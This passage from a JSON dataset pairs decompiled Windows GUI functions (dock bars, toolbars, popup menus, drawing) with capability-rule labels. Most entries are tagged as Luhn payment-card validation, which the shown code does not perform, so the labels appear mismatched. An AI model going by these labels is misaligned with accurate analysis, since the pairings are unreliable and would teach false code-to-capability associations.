        "decompiled_code": "\nvoid __fastcall fcn.0043ccd5(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uStack48;\n    uchar auStack28 [28];\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        uStack48 = 0;\n        iVar2 = (*pcVar1)(&stack0xffffffe4, 0, 0xf, 0xf);\n        if (iVar2 == 0) {\n            *(param_1 + 0x70) = *(*(param_1 + 0x68) + 0x80);\n            *(param_1 + 0x78) = *(*(param_1 + 0x68) + 0x7c) & 0xf000;\n            (*_sym.imp.USER32.dll_SetRectEmpty)(param_1 + 0xc);\n            *(param_1 + 0x20) = 0;\n            *(param_1 + 0x1c) = 0;\n            *(param_1 + 0x24) = 0;\n            *(param_1 + 0x7c) = 0;\n            *(param_1 + 0x80) = 0;\n            uVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            iVar2 = fcn.0042b432(uVar3);\n            iVar4 = (*_sym.imp.USER32.dll_LockWindowUpdate)(*(iVar2 + 0x1c));\n            if (iVar4 == 0) {\n                uVar3 = 3;\n            }\n            else {\n                uVar3 = 0x403;\n            }\n            uVar3 = (*_sym.imp.USER32.dll_GetDCEx)(*(iVar2 + 0x1c), 0, uVar3);\n            uVar3 = fcn.0043374e(uVar3);\n            *(param_1 + 0x84) = uVar3;\n            return;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetMessageA)(&stack0xffffffd0, 0, 0xf, 0xf);\n        if (iVar2 == 0) break;\n        uStack48 = 0x43cd0d;\n        (*_sym.imp.USER32.dll_DispatchMessageA)();\n    }\n    return;\n}\n",
        "token_count": 529
    },
    "0043d0fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d0fa(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.0043cd91(1);\n    (*_sym.imp.USER32.dll_ReleaseCapture)();\n    uVar2 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    iVar3 = fcn.0042b432(uVar2);\n    (*_sym.imp.USER32.dll_LockWindowUpdate)(0);\n    iVar1 = *(param_1 + 0x84);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ReleaseDC)(*(iVar3 + 0x1c), *(iVar1 + 4));\n        *(param_1 + 0x84) = 0;\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "0043dab2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043dab2(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    (**(*in_ECX + 0x13c))(&var_10h, in_ECX[0x1f] & 0xa000);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 192
    },
    "0043db39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0043db39(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0040fc82(param_1);\n    return -(0xffff < uVar1) & uVar1;\n}\n",
        "token_count": 58
    },
    "0043dd9f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043dd9f(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDockBar.0;\n    iVar3 = 0;\n    pcVar1 = extraout_ECX[0x27];\n    *(unaff_EBP + -4) = 1;\n    if (0 < pcVar1) {\n        do {\n            iVar2 = fcn.0043db39();\n            if ((iVar2 != 0) && (*(iVar2 + 0x88) == extraout_ECX)) {\n                *(iVar2 + 0x88) = 0;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < extraout_ECX[0x27]);\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.0042791f();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0043bc24();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 333
    },
    "0043f481": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043f481(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t Y, uint crColor)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.GDI32.dll_SetBkColor)(*(in_ECX + 4), crColor);\n    var_10h = arg_8h;\n    var_8h = arg_8h + arg_10h;\n    var_ch = arg_ch;\n    var_4h = arg_ch + Y;\n    (*_sym.imp.GDI32.dll_ExtTextOutA)(*(in_ECX + 4), 0, 0, 2, &var_10h, 0, 0, 0);\n    return;\n}\n",
        "token_count": 207
    },
    "0043f4cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043f4cd(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_4h;\n    \n    fcn.0043f481(arg_8h, arg_ch, arg_10h + -1, 1, arg_18h);\n    fcn.0043f481(arg_8h, arg_ch, 1, arg_14h + -1, arg_18h);\n    fcn.0043f481(arg_8h + arg_10h, arg_ch, 0xffffffff, arg_14h, arg_1ch);\n    fcn.0043f481(arg_8h, arg_ch + arg_14h, arg_10h, 0xffffffff, arg_1ch);\n    return;\n}\n",
        "token_count": 201
    },
    "0043f60c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043f60c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_40h;\n    uint var_29h;\n    uint var_24h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.00411850(&var_40h, 0, 0x3c);\n    var_40h = arg_8h;\n    var_29h._0_1_ = 1;\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(&var_24h, arg_ch, 0x20);\n    fcn.0043f537(&var_40h, arg_10h);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 190
    },
    "0043f671": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043f671(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00444bf8();\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + 0x2c);\n    return;\n}\n",
        "token_count": 58
    },
    "0044137f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044137f(uint param_1)\n\n{\n    fcn.00444bf8();\n    fcn.00446580(0x444b92);\n    fcn.00446246(param_1);\n    return;\n}\n",
        "token_count": 55
    },
    "004413a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004413a3(uint param_1)\n\n{\n    fcn.00444bf8();\n    fcn.00446580(0x444b92);\n    fcn.00446259(param_1);\n    return;\n}\n",
        "token_count": 55
    },
    "0044186e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_fch\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Variable defined which should be unmapped: lpmi\n// WARNING: Variable defined which should be unmapped: var_c8h\n// WARNING: Variable defined which should be unmapped: var_c4h\n// WARNING: Variable defined which should be unmapped: var_bch\n// WARNING: Variable defined which should be unmapped: var_ach\n// WARNING: Variable defined which should be unmapped: var_a8h\n// WARNING: Variable defined which should be unmapped: var_9ch_2\n// WARNING: Variable defined which should be unmapped: var_88h\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_68h_2\n// WARNING: Variable defined which should be unmapped: hmenu\n// WARNING: Variable defined which should be unmapped: lprc\n// WARNING: Variable defined which should be unmapped: dy\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h_2\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h_2\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n// WARNING: Variable defined which should be unmapped: var_18h_2\n// WARNING: Variable defined which should be unmapped: var_14h_2\n// WARNING: Variable defined which should be unmapped: var_4h_2\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: item\n// WARNING: Variable defined which should be unmapped: var_10h_2\n\nuint __cdecl\nfcn.0044186e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint noname_67, \n            uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, uint noname_73, \n            uint noname_74, uint noname_75, uint noname_76, uint noname_77, uint noname_78, uint noname_79, \n            uint noname_80, uint noname_81, uint noname_82, uint noname_83, uint noname_84, uint noname_85, \n            uint noname_86, uint noname_87, uint noname_88, uint noname_89, uint noname_90, uint noname_91, \n            uint noname_92, uint noname_93, uint noname_94, uint noname_95, uint noname_96, uint noname_97, \n            uint noname_98, uint noname_99, uint noname_100, uint noname_101, uint noname_102, uint noname_103, \n            uint noname_104, uint noname_105, uint noname_106, uint noname_107, uint noname_108, uint noname_109, \n            uint noname_110, uint noname_111, uint noname_112, uint noname_113, uint noname_114, uint noname_115, \n            uint noname_116, uint noname_117, uint noname_118, uint noname_119, uint noname_120, uint arg_8h, uint hWnd)\n\n{\n    uint *noname_1_00;\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint noname_7_00;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    code **ppcVar8;\n    uint extraout_ECX;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint32_t uVar9;\n    uint unaff_EDI;\n    uint32_t uVar10;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_8h;\n    uint item;\n    uint var_10h_2;\n    uint var_168h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_13ch;\n    uint lprcDst;\n    uint lprcSrc2;\n    uint var_cch;\n    uint var_9ch;\n    uint lprcSrc1;\n    uint var_70h;\n    uint var_68h;\n    uint var_48h;\n    uint var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint noname_3_00;\n    uint noname_4_00;\n    uint noname_5_00;\n    char *noname_10_00;\n    uint in_stack_fffffeb0;\n    uint in_stack_fffffeb4;\n    uint in_stack_fffffeb8;\n    uint in_stack_fffffebc;\n    uint in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint in_stack_fffffec8;\n    uint in_stack_fffffecc;\n    uint in_stack_fffffed0;\n    uint in_stack_fffffed4;\n    uint in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    uint in_stack_fffffee0;\n    uint in_stack_fffffee4;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint var_fch;\n    uint in_stack_ffffff04;\n    uint in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint var_ech;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint in_stack_ffffff28;\n    uint in_stack_ffffff2c;\n    uint lpmi;\n    uint var_c8h;\n    uint var_c4h;\n    uint in_stack_ffffff3c;\n    uint var_bch;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint var_ach;\n    uint var_a8h;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint var_9ch_2;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint var_88h;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint var_7ch;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff90;\n    uint var_68h_2;\n    uint hmenu;\n    uint in_stack_ffffff9c;\n    uint in_stack_ffffffa0;\n    uint lprc;\n    uint dy;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h_2;\n    uint var_44h;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint var_38h;\n    uint var_34h_2;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h;\n    uint var_1ch_2;\n    uint var_18h_2;\n    uint var_14h_2;\n    uint in_stack_ffffffec;\n    uint in_stack_fffffff0;\n    uint in_stack_fffffff4;\n    uint var_4h_2;\n    uint noname_97_00;\n    \n    noname_97_00 = 0x441878;\n    fcn.004118b0();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    piVar2 = fcn.004290ee();\n    iVar3 = (**(*piVar2 + 0xc))();\n    *(unaff_EBP + -0x10) = iVar3 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    noname_10_00 = \"ReBarWindow32\";\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    iVar4 = iVar4 + 1;\n    iVar3 = iVar4;\n    noname_7_00 = fcn.004019c0();\n    noname_1_00 = *(unaff_EBP + 0xc);\n    uVar7 = *noname_1_00;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    noname_5_00 = 0xffffffff;\n    fcn.004059a0();\n    noname_4_00 = *noname_1_00;\n    iVar5 = fcn.0042b459();\n    *(unaff_EBP + 0xc) = iVar5;\n    iVar6 = fcn.004118cf(*(unaff_EBP + -0x10), \"ReBarWindow32\");\n    if ((iVar6 == 0) && (iVar5 != 0)) {\n        noname_3_00 = 0x4542e8;\n        iVar6 = fcn.0042ffa1();\n        if (iVar6 != 0) {\n            iVar6 = fcn.0042bedc();\n            if ((iVar6 != 0) && (*(unaff_EBP + -0x14) != iVar6)) {\n                uVar7 = fcn.0044186e(*(unaff_EBP + 8), noname_1_00, *(unaff_EBP + 0x10), noname_3_00, noname_4_00, \n                                     noname_5_00, uVar7, noname_7_00, iVar4, iVar3, noname_10_00, unaff_EDI, unaff_ESI, \n                                     unaff_EBX, in_stack_fffffeb0, in_stack_fffffeb4, in_stack_fffffeb8, \n                                     in_stack_fffffebc, in_stack_fffffec0, in_stack_fffffec4, in_stack_fffffec8, \n                                     in_stack_fffffecc, in_stack_fffffed0, in_stack_fffffed4, in_stack_fffffed8, \n                                     in_stack_fffffedc, in_stack_fffffee0, in_stack_fffffee4, in_stack_fffffee8, \n                                     in_stack_fffffeec, in_stack_fffffef0, in_stack_fffffef4, in_stack_fffffef8, \n                                     in_stack_fffffefc, var_fch, in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c\n                                     , var_ech, in_stack_ffffff14, in_stack_ffffff18, in_stack_ffffff1c, \n                                     in_stack_ffffff20, in_stack_ffffff24, in_stack_ffffff28, in_stack_ffffff2c, lpmi, \n                                     var_c8h, var_c4h, in_stack_ffffff3c, var_bch, in_stack_ffffff44, in_stack_ffffff48\n                                     , in_stack_ffffff4c, var_ach, var_a8h, in_stack_ffffff58, in_stack_ffffff5c, \n                                     var_9ch_2, in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, \n                                     in_stack_ffffff70, var_88h, in_stack_ffffff78, in_stack_ffffff7c, var_7ch, \n                                     in_stack_ffffff84, in_stack_ffffff88, in_stack_ffffff8c, in_stack_ffffff90, \n                                     var_68h_2, hmenu, in_stack_ffffff9c, in_stack_ffffffa0, lprc, dy, var_50h, var_4ch\n                                     , var_48h_2, var_44h, in_stack_ffffffbc, in_stack_ffffffc0, var_38h, var_34h_2, \n                                     var_30h, var_2ch, var_28h_2, var_24h_2, var_20h, var_1ch_2, var_18h_2, var_14h_2, \n                                     in_stack_ffffffec, in_stack_fffffff0, in_stack_fffffff4, var_4h_2, noname_97_00, \n                                     unaff_retaddr, var_8h, item, var_10h_2, noname_3, noname_4, noname_5, noname_6, \n                                     noname_7, noname_8, noname_9, noname_10, noname_11, noname_12, noname_13, noname_14\n                                     , noname_15, noname_16, noname_17, noname_18, noname_19, noname_20, noname_21, \n                                     noname_22, noname_23);\n                goto code_r0x00441d4e;\n            }\n            fcn.0042f865();\n            *(unaff_EBP + -4) = 1;\n            piVar2 = fcn.004290ee();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *(unaff_EBP + 8) = iVar3 + 0x10;\n            *(unaff_EBP + -4) = 2;\n            piVar2 = fcn.004290ee();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *(unaff_EBP + -0x18) = iVar3 + 0x10;\n            *(unaff_EBP + -4) = 3;\n            fcn.0043307e();\n            *(unaff_EBP + -4) = 4;\n            fcn.004337f3(*(unaff_EBP + -0x14));\n            pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n            *(unaff_EBP + -4) = 5;\n            *(unaff_EBP + -0x15c) = 0x50;\n            *(unaff_EBP + -0x158) = 0x10;\n            (*pcVar1)();\n            (*pcVar1)(*(iVar5 + 0x1c), 0x409, noname_1_00[3], unaff_EBP + -0x78);\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(\"ToolbarWindow32\");\n            uVar7 = fcn.004019c0(iVar3 + 1, iVar3 + 1);\n            (*_sym.imp.USER32.dll_GetClassNameA)(*(unaff_EBP + -0x13c), uVar7);\n            fcn.004059a0();\n            uVar7 = fcn.0042b459();\n            *(unaff_EBP + -0x28) = uVar7;\n            iVar3 = fcn.004118cf(*(unaff_EBP + -0x10), \"ToolbarWindow32\");\n            if ((iVar3 == 0) && (iVar3 = *(unaff_EBP + -0x28),  iVar3 != 0)) {\n                iVar4 = fcn.0042ffa1();\n                if (iVar4 != 0) {\n                    *(unaff_EBP + -0x70) = noname_1_00[6];\n                    *(unaff_EBP + -0x34) = noname_1_00 + 6;\n                    fcn.0043344f();\n                    fcn.00433413();\n                    iVar4 = fcn.0040f9cd();\n                    *(unaff_EBP + -0x1c) = iVar4;\n                    do {\n                        iVar4 = iVar4 + -1;\n                        uVar7 = *(iVar3 + 0x1c);\n                        *(unaff_EBP + 0xc) = iVar4;\n                        (*pcVar1)(uVar7, 0x41d, iVar4, unaff_EBP + -0xdc);\n                        iVar5 = (*_sym.imp.USER32.dll_IntersectRect)\n                                          (unaff_EBP + -0x10c, unaff_EBP + -0x78, unaff_EBP + -0xdc);\n                        if (iVar5 != 0) break;\n                    } while (iVar4 != 0);\n                    fcn.00411850(unaff_EBP + -0xcc, 0, 0x30);\n                    *(unaff_EBP + -0xcc) = 0x30;\n                    iVar4 = fcn.0040fa34();\n                    iVar3 = *(unaff_EBP + -0x1c);\n                    uVar10 = *(unaff_EBP + 0xc);\n                    fcn.004112a0();\n                    *(unaff_EBP + -0x24) = &stack0xfffffe70;\n                    uVar9 = 0;\n                    fcn.00411850(*(unaff_EBP + -0x24), 0, (iVar3 - uVar10) * 4);\n                    uVar7 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                    fcn.0042f7f8(uVar7);\n                    fcn.004068d0(unaff_EBP + -0x9c);\n                    pcVar1 = _sym.imp.USER32.dll_CopyRect;\n                    *(unaff_EBP + -0x20) = 0;\n                    if (uVar10 < *(unaff_EBP + -0x1c)) {\n                        do {\n                            fcn.0043a373(*(unaff_EBP + 0xc), unaff_EBP + -0x30, unaff_EBP + -0x38, unaff_EBP + -0x2c);\n                            if ((*(unaff_EBP + -0x38) & 1) == 0) {\n                                *(unaff_EBP + -200) = 0x162;\n                                fcn.00401bb0(*(unaff_EBP + -0x30));\n                                fcn.00429033(unaff_EBP + -0x18, *(unaff_EBP + 8), 1, 10);\n                                ppcVar8 = fcn.0042eabb(8);\n                                if (ppcVar8 == NULL) {\n                                    ppcVar8 = NULL;\n                                }\n                                else {\n                                    ppcVar8[1] = NULL;\n                                    *ppcVar8 = vtable.CBitmap.0;\n                                }\n                                piVar2 = *(unaff_EBP + -0x24) + uVar9 * 4;\n                                *piVar2 = ppcVar8;\n                                (*_sym.imp.COMCTL32.dll_ImageList_GetImageInfo)\n                                          (*(iVar4 + 4), *(unaff_EBP + -0x2c), unaff_EBP + -0xfc);\n                                (*pcVar1)(unaff_EBP + -0x58, unaff_EBP + -0xec);\n                                (*_sym.imp.USER32.dll_OffsetRect)\n                                          (unaff_EBP + -0x58, -*(unaff_EBP + -0x58), -*(unaff_EBP + -0x54));\n                                fcn.00406870(unaff_EBP + -0x9c, *(unaff_EBP + -0x50), *(unaff_EBP + -0x4c));\n                                iVar3 = *piVar2;\n                                if (iVar3 != 0) {\n                                    iVar3 = *(iVar3 + 4);\n                                }\n                                iVar3 = fcn.00433b14(*(unaff_EBP + -0x44), iVar3);\n                                *piVar2 = iVar3;\n                                (*_sym.imp.USER32.dll_GetSysColor)(4);\n                                fcn.0043efcd();\n                                fcn.0040f9f9(unaff_EBP + -0x48, *(unaff_EBP + -0x2c), 0, 0, 1);\n                                iVar3 = *piVar2;\n                                if (iVar3 != 0) {\n                                    iVar3 = *(iVar3 + 4);\n                                }\n                                iVar3 = fcn.00433b14(*(unaff_EBP + -0x44), iVar3);\n                                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n                                *piVar2 = iVar3;\n                                *(unaff_EBP + -0xa8) = *(unaff_EBP + -0x18);\n                                *(unaff_EBP + -0xbc) = *(unaff_EBP + -0x30);\n                                *(unaff_EBP + -0xc4) = 0x100;\n                                uVar9 = *(unaff_EBP + -0x20);\n                                *(unaff_EBP + -0xac) = *piVar2;\ncode_r0x00441c55:\n                                (*_sym.imp.USER32.dll_InsertMenuItemA)\n                                          (*(unaff_EBP + -100), *(unaff_EBP + 0xc), 1, unaff_EBP + -0xcc);\n                            }\n                            else if (uVar9 != 0) {\n                                *(unaff_EBP + -200) = 0x100;\n                                *(unaff_EBP + -0xc4) = 0x800;\n                                goto code_r0x00441c55;\n                            }\n                            *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\n                        } while (*(unaff_EBP + 0xc) < *(unaff_EBP + -0x1c));\n                    }\n                    (*pcVar1)(unaff_EBP + -0x88, *(unaff_EBP + -0x34));\n                    fcn.0043344f();\n                    fcn.0042a717(0, *(unaff_EBP + -0x88), *(unaff_EBP + -0x7c), *(unaff_EBP + -0x14), 0);\n                    uVar10 = 0;\n                    **(unaff_EBP + 0x10) = 0;\n                    if (uVar9 != 0) {\n                        do {\n                            piVar2 = *(*(unaff_EBP + -0x24) + uVar10 * 4);\n                            if (piVar2 != NULL) {\n                                (**(*piVar2 + 4))();\n                            }\n                            uVar10 = uVar10 + 1;\n                        } while (uVar10 < uVar9);\n                    }\n                    *(unaff_EBP + -4) = 4;\n                    fcn.0043384e();\n                    *(unaff_EBP + -4) = 3;\n                    fcn.004337da();\n                    fcn.00401200();\n                    fcn.00401200();\n                    *(unaff_EBP + -4) = 0;\n                    fcn.0042f95c();\n                    uVar7 = 1;\n                    goto code_r0x00441d4e;\n                }\n            }\n            *(unaff_EBP + -4) = 4;\n            fcn.0043384e();\n            *(unaff_EBP + -4) = 3;\n            fcn.004337da();\n            fcn.00401200();\n            fcn.00401200();\n            *(unaff_EBP + -4) = 0;\n            fcn.0042f95c();\n        }\n    }\n    uVar7 = 0;\ncode_r0x00441d4e:\n    fcn.00401200();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar7;\n}\n",
        "token_count": 5854
    },
    "00441e1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: ARG_0\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.00441e1c(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_34h;\n    uint ARG_0;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = *0x4640c8;\n    piVar1 = fcn.004290ee();\n    iVar2 = (**(*piVar1 + 0xc))();\n    *(unaff_EBP + -0x34) = iVar2 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.0042dd19();\n    if ((uVar3 & 0x4000) == 0) {\n        fcn.00447038(extraout_ECX + 0xc0);\n        if (*(unaff_EBP + 8) != 0) {\n            fcn.00405f70(0x45293c);\n            fcn.00405f70(*(unaff_EBP + 8));\n            if (0 < *(extraout_ECX + 0x54)) {\n                (*_sym.imp.USER32.dll_wsprintfA)(unaff_EBP + -0x30, 0x452940, *(extraout_ECX + 0x54));\n                fcn.00405f70(unaff_EBP + -0x30);\n            }\n        }\n    }\n    else {\n        if (*(unaff_EBP + 8) != 0) {\n            fcn.00405f70(*(unaff_EBP + 8));\n            if (0 < *(extraout_ECX + 0x54)) {\n                (*_sym.imp.USER32.dll_wsprintfA)(unaff_EBP + -0x30, 0x452940, *(extraout_ECX + 0x54));\n                fcn.00405f70(unaff_EBP + -0x30);\n            }\n            fcn.00405f70(0x45293c);\n        }\n        fcn.00447038();\n    }\n    fcn.00434b8c(*(extraout_ECX + 0x1c), *(unaff_EBP + -0x34));\n    fcn.00401200();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 608
    },
    "004420cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004420cd(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    char *pcVar1;\n    \n    for (pcVar1 = param_3 + param_1; (pcVar1 < param_2 + param_1 && (*pcVar1 != '\\r')); pcVar1 = pcVar1 + 1) {\n    }\n    return pcVar1 - param_1;\n}\n",
        "token_count": 101
    },
    "00442c45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442c45(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    int32_t lParam;\n    int32_t wParam;\n    \n    lParam = in_ECX;\n    wParam = in_ECX;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0xb0, &wParam, &lParam);\n    iVar1 = fcn.00442675();\n    iVar2 = fcn.004420cd(iVar1, lParam, wParam);\n    iVar2 = iVar2 - wParam;\n    arg_8h_00 = fcn.004019c0(iVar2);\n    fcn.00411970(arg_8h_00, iVar1 + wParam, iVar2);\n    fcn.004059a0(iVar2);\n    fcn.004426ef();\n    return;\n}\n",
        "token_count": 215
    },
    "00443534": {
        "rules": [
